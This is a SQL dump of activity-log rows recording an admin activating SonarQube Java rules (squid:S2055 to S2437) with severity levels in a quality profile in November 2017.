INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1299, '2017-11-20 10:14:47.268', 'admin', 'key=java-lena-qp_15-78480:squid:S2055;ruleKey=squid:S2055;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FLkbbGRdfPp-qx2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1300, '2017-11-20 10:14:47.395', 'admin', 'key=java-lena-qp_15-78480:squid:S2060;ruleKey=squid:S2060;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FNjbbGRdfPp-qx3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1301, '2017-11-20 10:14:47.531', 'admin', 'key=java-lena-qp_15-78480:squid:S2061;ruleKey=squid:S2061;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FPrbbGRdfPp-qx4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1302, '2017-11-20 10:14:47.575', 'admin', 'key=java-lena-qp_15-78480:squid:S2062;ruleKey=squid:S2062;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FQXbbGRdfPp-qx5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1303, '2017-11-20 10:14:47.604', 'admin', 'key=java-lena-qp_15-78480:squid:S2065;ruleKey=squid:S2065;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FQ0bbGRdfPp-qx6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1304, '2017-11-20 10:14:47.639', 'admin', 'key=java-lena-qp_15-78480:squid:S2066;ruleKey=squid:S2066;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FRXbbGRdfPp-qx7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1305, '2017-11-20 10:14:47.676', 'admin', 'key=java-lena-qp_15-78480:squid:S2068;ruleKey=squid:S2068;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FR8bbGRdfPp-qx8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1306, '2017-11-20 10:14:47.721', 'admin', 'key=java-lena-qp_15-78480:squid:S2077;ruleKey=squid:S2077;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FSpbbGRdfPp-qx9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1307, '2017-11-20 10:14:47.757', 'admin', 'key=java-lena-qp_15-78480:squid:S2092;ruleKey=squid:S2092;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FTNbbGRdfPp-qx-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1308, '2017-11-20 10:14:47.797', 'admin', 'key=java-lena-qp_15-78480:squid:S2093;ruleKey=squid:S2093;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FT1bbGRdfPp-qx_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1309, '2017-11-20 10:14:47.832', 'admin', 'key=java-lena-qp_15-78480:squid:S2094;ruleKey=squid:S2094;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FUYbbGRdfPp-qyA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1310, '2017-11-20 10:14:47.87', 'admin', 'key=java-lena-qp_15-78480:squid:S2095;ruleKey=squid:S2095;profileKey=java-lena-qp_15-78480;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FU-bbGRdfPp-qyB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1311, '2017-11-20 10:14:47.909', 'admin', 'key=java-lena-qp_15-78480:squid:S2097;ruleKey=squid:S2097;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FVlbbGRdfPp-qyC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1312, '2017-11-20 10:14:47.946', 'admin', 'key=java-lena-qp_15-78480:squid:S2109;ruleKey=squid:S2109;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FWKbbGRdfPp-qyD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1313, '2017-11-20 10:14:48.024', 'admin', 'key=java-lena-qp_15-78480:squid:S2110;ruleKey=squid:S2110;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FXYbbGRdfPp-qyE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1314, '2017-11-20 10:14:48.055', 'admin', 'key=java-lena-qp_15-78480:squid:S2111;ruleKey=squid:S2111;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FX3bbGRdfPp-qyF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1315, '2017-11-20 10:14:48.094', 'admin', 'key=java-lena-qp_15-78480:squid:S2112;ruleKey=squid:S2112;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FYebbGRdfPp-qyG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1316, '2017-11-20 10:14:48.118', 'admin', 'key=java-lena-qp_15-78480:squid:S2114;ruleKey=squid:S2114;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FY2bbGRdfPp-qyH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1317, '2017-11-20 10:14:48.152', 'admin', 'key=java-lena-qp_15-78480:squid:S2116;ruleKey=squid:S2116;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FZYbbGRdfPp-qyI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1318, '2017-11-20 10:14:48.21', 'admin', 'key=java-lena-qp_15-78480:squid:S2118;ruleKey=squid:S2118;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FaSbbGRdfPp-qyJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1319, '2017-11-20 10:14:48.267', 'admin', 'key=java-lena-qp_15-78480:squid:S2122;ruleKey=squid:S2122;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FbLbbGRdfPp-qyK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1320, '2017-11-20 10:14:48.306', 'admin', 'key=java-lena-qp_15-78480:squid:S2123;ruleKey=squid:S2123;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FbybbGRdfPp-qyL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1321, '2017-11-20 10:14:48.372', 'admin', 'key=java-lena-qp_15-78480:squid:S2127;ruleKey=squid:S2127;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Fc0bbGRdfPp-qyM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1322, '2017-11-20 10:14:48.398', 'admin', 'key=java-lena-qp_15-78480:squid:S2129;ruleKey=squid:S2129;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FdObbGRdfPp-qyN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1323, '2017-11-20 10:14:48.425', 'admin', 'key=java-lena-qp_15-78480:squid:S2130;ruleKey=squid:S2130;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FdpbbGRdfPp-qyO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1324, '2017-11-20 10:14:48.456', 'admin', 'key=java-lena-qp_15-78480:squid:S2131;ruleKey=squid:S2131;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FeIbbGRdfPp-qyP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1325, '2017-11-20 10:14:48.483', 'admin', 'key=java-lena-qp_15-78480:squid:S2133;ruleKey=squid:S2133;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FejbbGRdfPp-qyQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1326, '2017-11-20 10:14:48.513', 'admin', 'key=java-lena-qp_15-78480:squid:S2134;ruleKey=squid:S2134;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FfBbbGRdfPp-qyR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1327, '2017-11-20 10:14:48.548', 'admin', 'key=java-lena-qp_15-78480:squid:S2140;ruleKey=squid:S2140;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FfkbbGRdfPp-qyS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1328, '2017-11-20 10:14:48.575', 'admin', 'key=java-lena-qp_15-78480:squid:S2142;ruleKey=squid:S2142;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Ff_bbGRdfPp-qyT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1329, '2017-11-20 10:14:48.601', 'admin', 'key=java-lena-qp_15-78480:squid:S2147;ruleKey=squid:S2147;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FgZbbGRdfPp-qyU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1330, '2017-11-20 10:14:48.624', 'admin', 'key=java-lena-qp_15-78480:squid:S2151;ruleKey=squid:S2151;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FgwbbGRdfPp-qyV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1331, '2017-11-20 10:14:48.643', 'admin', 'key=java-lena-qp_15-78480:squid:S2153;ruleKey=squid:S2153;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FhDbbGRdfPp-qyW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1332, '2017-11-20 10:14:48.683', 'admin', 'key=java-lena-qp_15-78480:squid:S2154;ruleKey=squid:S2154;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FhrbbGRdfPp-qyX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1333, '2017-11-20 10:14:48.724', 'admin', 'key=java-lena-qp_15-78480:squid:S2157;ruleKey=squid:S2157;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FiUbbGRdfPp-qyY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1334, '2017-11-20 10:14:48.752', 'admin', 'key=java-lena-qp_15-78480:squid:S2159;ruleKey=squid:S2159;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FiwbbGRdfPp-qyZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1335, '2017-11-20 10:14:48.788', 'admin', 'key=java-lena-qp_15-78480:squid:S2160;ruleKey=squid:S2160;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FjUbbGRdfPp-qya');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1336, '2017-11-20 10:14:48.812', 'admin', 'key=java-lena-qp_15-78480:squid:S2165;ruleKey=squid:S2165;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FjsbbGRdfPp-qyb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1337, '2017-11-20 10:14:48.879', 'admin', 'key=java-lena-qp_15-78480:squid:S2166;ruleKey=squid:S2166;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FkvbbGRdfPp-qyc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1338, '2017-11-20 10:14:48.917', 'admin', 'key=java-lena-qp_15-78480:squid:S2167;ruleKey=squid:S2167;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FlVbbGRdfPp-qyd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1339, '2017-11-20 10:14:48.948', 'admin', 'key=java-lena-qp_15-78480:squid:S2168;ruleKey=squid:S2168;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Fl0bbGRdfPp-qye');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1340, '2017-11-20 10:14:48.984', 'admin', 'key=java-lena-qp_15-78480:squid:S2175;ruleKey=squid:S2175;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FmYbbGRdfPp-qyf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1341, '2017-11-20 10:14:49.02', 'admin', 'key=java-lena-qp_15-78480:squid:S2176;ruleKey=squid:S2176;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Fm8bbGRdfPp-qyg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1342, '2017-11-20 10:14:49.048', 'admin', 'key=java-lena-qp_15-78480:squid:S2177;ruleKey=squid:S2177;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FnYbbGRdfPp-qyh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1343, '2017-11-20 10:14:49.083', 'admin', 'key=java-lena-qp_15-78480:squid:S2178;ruleKey=squid:S2178;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Fn7bbGRdfPp-qyi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1344, '2017-11-20 10:14:49.11', 'admin', 'key=java-lena-qp_15-78480:squid:S2183;ruleKey=squid:S2183;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FoWbbGRdfPp-qyj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1345, '2017-11-20 10:14:49.148', 'admin', 'key=java-lena-qp_15-78480:squid:S2184;ruleKey=squid:S2184;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Fo8bbGRdfPp-qyk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1346, '2017-11-20 10:14:49.194', 'admin', 'key=java-lena-qp_15-78480:squid:S2185;ruleKey=squid:S2185;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FpqbbGRdfPp-qyl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1347, '2017-11-20 10:14:49.25', 'admin', 'key=java-lena-qp_15-78480:squid:S2186;ruleKey=squid:S2186;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FqhbbGRdfPp-qym');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1348, '2017-11-20 10:14:49.314', 'admin', 'key=java-lena-qp_15-78480:squid:S2187;ruleKey=squid:S2187;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FribbGRdfPp-qyn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1349, '2017-11-20 10:14:49.397', 'admin', 'key=java-lena-qp_15-78480:squid:S2188;ruleKey=squid:S2188;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Fs1bbGRdfPp-qyo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1350, '2017-11-20 10:14:49.479', 'admin', 'key=java-lena-qp_15-78480:squid:S2189;ruleKey=squid:S2189;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FuHbbGRdfPp-qyp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1351, '2017-11-20 10:14:49.516', 'admin', 'key=java-lena-qp_15-78480:squid:S2200;ruleKey=squid:S2200;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FusbbGRdfPp-qyq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1352, '2017-11-20 10:14:49.573', 'admin', 'key=java-lena-qp_15-78480:squid:S2201;ruleKey=squid:S2201;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FvkbbGRdfPp-qyr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1353, '2017-11-20 10:14:49.615', 'admin', 'key=java-lena-qp_15-78480:squid:S2204;ruleKey=squid:S2204;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FwPbbGRdfPp-qys');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1354, '2017-11-20 10:14:49.651', 'admin', 'key=java-lena-qp_15-78480:squid:S2209;ruleKey=squid:S2209;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FwzbbGRdfPp-qyt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1355, '2017-11-20 10:14:49.68', 'admin', 'key=java-lena-qp_15-78480:squid:S2222;ruleKey=squid:S2222;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FxQbbGRdfPp-qyu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1356, '2017-11-20 10:14:49.705', 'admin', 'key=java-lena-qp_15-78480:squid:S2225;ruleKey=squid:S2225;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FxpbbGRdfPp-qyv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1357, '2017-11-20 10:14:49.74', 'admin', 'key=java-lena-qp_15-78480:squid:S2226;ruleKey=squid:S2226;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FyMbbGRdfPp-qyw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1358, '2017-11-20 10:14:49.775', 'admin', 'key=java-lena-qp_15-78480:squid:S2230;ruleKey=squid:S2230;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FyvbbGRdfPp-qyx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1359, '2017-11-20 10:14:49.803', 'admin', 'key=java-lena-qp_15-78480:squid:S2232;ruleKey=squid:S2232;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FzLbbGRdfPp-qyy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1360, '2017-11-20 10:14:49.838', 'admin', 'key=java-lena-qp_15-78480:squid:S2235;ruleKey=squid:S2235;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FzubbGRdfPp-qyz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1361, '2017-11-20 10:14:49.867', 'admin', 'key=java-lena-qp_15-78480:squid:S2236;ruleKey=squid:S2236;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F0LbbGRdfPp-qy0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1362, '2017-11-20 10:14:49.889', 'admin', 'key=java-lena-qp_15-78480:squid:S2251;ruleKey=squid:S2251;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F0hbbGRdfPp-qy1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1363, '2017-11-20 10:14:49.926', 'admin', 'key=java-lena-qp_15-78480:squid:S2252;ruleKey=squid:S2252;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F1GbbGRdfPp-qy2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1364, '2017-11-20 10:14:49.967', 'admin', 'key=java-lena-qp_15-78480:squid:S2254;ruleKey=squid:S2254;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F1vbbGRdfPp-qy3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1365, '2017-11-20 10:14:50.003', 'admin', 'key=java-lena-qp_15-78480:squid:S2259;ruleKey=squid:S2259;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F2TbbGRdfPp-qy4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1366, '2017-11-20 10:14:50.039', 'admin', 'key=java-lena-qp_15-78480:squid:S2272;ruleKey=squid:S2272;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F23bbGRdfPp-qy5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1367, '2017-11-20 10:14:50.079', 'admin', 'key=java-lena-qp_15-78480:squid:S2273;ruleKey=squid:S2273;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F3fbbGRdfPp-qy6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1368, '2017-11-20 10:14:50.115', 'admin', 'key=java-lena-qp_15-78480:squid:S2274;ruleKey=squid:S2274;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F4DbbGRdfPp-qy7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1369, '2017-11-20 10:14:50.149', 'admin', 'key=java-lena-qp_15-78480:squid:S2275;ruleKey=squid:S2275;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F4lbbGRdfPp-qy8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1370, '2017-11-20 10:14:50.199', 'admin', 'key=java-lena-qp_15-78480:squid:S2276;ruleKey=squid:S2276;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F5XbbGRdfPp-qy9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1371, '2017-11-20 10:14:50.257', 'admin', 'key=java-lena-qp_15-78480:squid:S2277;ruleKey=squid:S2277;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F6RbbGRdfPp-qy-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1372, '2017-11-20 10:14:50.368', 'admin', 'key=java-lena-qp_15-78480:squid:S2278;ruleKey=squid:S2278;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F7_bbGRdfPp-qy_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1373, '2017-11-20 10:14:50.483', 'admin', 'key=java-lena-qp_15-78480:squid:S2293;ruleKey=squid:S2293;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F9zbbGRdfPp-qzA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1374, '2017-11-20 10:14:50.545', 'admin', 'key=java-lena-qp_15-78480:squid:S2326;ruleKey=squid:S2326;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F-xbbGRdfPp-qzB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1375, '2017-11-20 10:14:50.563', 'admin', 'key=java-lena-qp_15-78480:squid:S2386;ruleKey=squid:S2386;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F_DbbGRdfPp-qzC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1376, '2017-11-20 10:14:50.584', 'admin', 'key=java-lena-qp_15-78480:squid:S2387;ruleKey=squid:S2387;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F_YbbGRdfPp-qzD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1377, '2017-11-20 10:14:50.617', 'admin', 'key=java-lena-qp_15-78480:squid:S2388;ruleKey=squid:S2388;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7F_5bbGRdfPp-qzE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1378, '2017-11-20 10:14:50.64', 'admin', 'key=java-lena-qp_15-78480:squid:S2390;ruleKey=squid:S2390;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GAQbbGRdfPp-qzF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1379, '2017-11-20 10:14:50.664', 'admin', 'key=java-lena-qp_15-78480:squid:S2391;ruleKey=squid:S2391;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GAobbGRdfPp-qzG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1380, '2017-11-20 10:14:50.689', 'admin', 'key=java-lena-qp_15-78480:squid:S2437;ruleKey=squid:S2437;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GBBbbGRdfPp-qzH');
